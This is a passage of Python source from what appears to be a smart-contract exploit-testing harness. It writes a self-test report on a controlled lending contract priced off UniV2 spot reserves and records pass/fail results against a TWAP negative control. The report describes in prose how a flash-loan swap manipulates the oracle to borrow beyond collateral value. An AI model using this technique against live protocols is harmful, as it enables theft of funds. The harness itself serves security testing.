                          if re.search(r"PASS|FAIL|CHAIN_PROFIT|Suite result", l))[:1200]
        md = ("> **Harness self-test — controlled target, not a historical reproduction.**\n\n"
              "# Spot-price oracle manipulation enables bad-debt borrow\n\n"
              "**Chain:** ethereum (fork)  ·  **Contract:** (controlled Lending + UniV2 Pair, deployed on the fork)  ·  **Verdict:** CONFIRMED\n\n"
              "## Description\n"
              "The lending contract values collateral off a UniV2 pair's SPOT reserves. An attacker whose "
              "flash-loan-funded swap skews the reserves in the same transaction inflates the collateral "
              "price and borrows far beyond the collateral's true value, leaving bad debt. Proven on a fork: "
              f"the attacker borrowed **{vuln['profit_wei']} wei** more USD than its collateral was worth.\n\n"
              "## Vulnerability Details\n"
              "`price()` returns `pair.spotPrice()` (current reserves), which is manipulable within a single "
              "transaction; `maxBorrow = collateral * spot`.\n\n"
              "## Impact Details\n"
              f"- **Excess borrowed (bad debt) on the fork:** {vuln['profit_wei']} wei of the USD token.\n\n"
              "## Proof of Concept\n"
              f"Foundry test (local fork, `require(block.chainid == 1)`, never broadcast): `{vuln['test_path']}`\n```\n{trace}\n```\n"
              f"Negative control (same template, TWAP oracle): profit {safe['profit_wei']} wei → **discarded**.\n\n"
              "## Recommendation\n"
              "Value collateral off a manipulation-resistant oracle (Chainlink, or a UniV2 TWAP over a "
              "multi-block window), never spot reserves.\n")
        report_path = str(out_dir / f"self_test_spot_{ts}.md")
        Path(report_path).write_text(md, encoding="utf-8")

    readme = out_dir / "SELFTEST_README.md"
    extra = (f"\n\n## Spot-price flash-manip ({ts} UTC) — {'GREEN (both directions)' if green else 'NOT GREEN'}\n"
             f"| Target | Oracle | Expected | Result |\n|---|---|---|---|\n"
             f"| Lending.borrow | SPOT reserves | CONFIRMED | "
             f"{'PASS, +' + str(vuln['profit_wei']) + ' wei bad debt' if vuln_confirmed else 'unexpected: ' + str(vuln['profit_wei'])} |\n"
             f"| Lending.borrow | TWAP | DISCARDED | "
             f"{'discarded (profit ' + str(safe['profit_wei']) + ')' if safe_discarded else 'unexpected: ' + str(safe['profit_wei'])} |\n")
    try:
        readme.write_text((readme.read_text(encoding="utf-8") if readme.exists() else "# Chain-exploit self-tests") + extra, encoding="utf-8")
    except OSError:
        pass
    return {"green": green, "vuln_confirmed": vuln_confirmed, "safe_discarded": safe_discarded,
            "vuln_profit_wei": vuln["profit_wei"], "safe_profit_wei": safe["profit_wei"], "report_path": report_path}
